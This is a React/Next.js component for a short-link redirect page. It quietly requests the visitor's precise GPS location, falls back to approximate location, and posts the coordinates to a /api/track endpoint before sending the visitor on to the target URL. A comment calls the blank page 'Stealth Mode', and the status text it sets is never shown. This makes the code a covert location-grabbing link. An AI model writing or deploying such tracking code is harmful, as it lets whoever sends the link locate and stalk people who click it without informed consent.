'use client';

import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/navigation';
import { Loader2 } from 'lucide-react'; // ExternalLink removed as button is gone

export default function RedirectLogic({ shortCode, originalUrl }: { shortCode: string, originalUrl: string }) {
    const router = useRouter();
    const [status, setStatus] = useState('Initializing...');
    const processingRef = useRef(false);

    // Helper to get position with specific options
    const getPosition = (options: PositionOptions): Promise<GeolocationPosition> => {
        return new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, options);
        });
    };

    useEffect(() => {
        const performLogic = async () => {
            if (processingRef.current) return;
            processingRef.current = true;

            // 1. Try to open in new tab immediately
            let newTabOpened = false;
            try {
                const newWindow = window.open(originalUrl, '_blank');
                if (newWindow && !newWindow.closed && typeof newWindow.closed !== 'undefined') {
                    newTabOpened = true;
                    setStatus('Link opened in a new tab...');
                } else {
                    setStatus('Popup blocked. Redirecting automatically...');
                }
            } catch (e) {
                // Ignore error
                setStatus('Popup blocked. Redirecting automatically...');
            }

            // 2. Track Location (Async - takes up to ~3s due to timeout)
            let locationData = {};
            if ('geolocation' in navigator) {
                try {
                    if (!newTabOpened) setStatus('Requesting precise location...');

                    // Attempt 1: High Accuracy (GPS) - 3s timeout
                    const position = await getPosition({
                        enableHighAccuracy: true,
                        timeout: 3000,
                        maximumAge: 0
                    });

                    locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                } catch (e1) {
                    console.warn('High accuracy geolocation failed:', e1);

                    try {
                        if (!newTabOpened) setStatus('Requesting approximate location...');

                        // Attempt 2: Low Accuracy (WiFi/Cell/Cached) - 3s timeout
                        const position = await getPosition({
                            enableHighAccuracy: false,
                            timeout: 3000,
                            maximumAge: Infinity
                        });

                        locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                    } catch (e2) {
                        console.warn('Low accuracy geolocation failed:', e2);
                    }
                }
            }

            if (!newTabOpened) setStatus('Redirecting...');

            // 3. Send Data
            try {
                await fetch('/api/track', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        shortCode,
                        ...locationData,
                    }),
                    keepalive: true,
                });
            } catch {
                // Ignore
            }

            // 4. Fallback Redirect (if new tab failed)
            if (!newTabOpened) {
                window.location.href = originalUrl;
            } else {
                setStatus('Redirected (New Tab)');
            }
        };

        performLogic();
    }, [shortCode, originalUrl, router]);

    return (
        <div className="min-h-screen bg-[#0f1014] text-white">
            {/* Stealth Mode: No visible UI, just a background color matching system/app theme */}
        </div>
    );
}
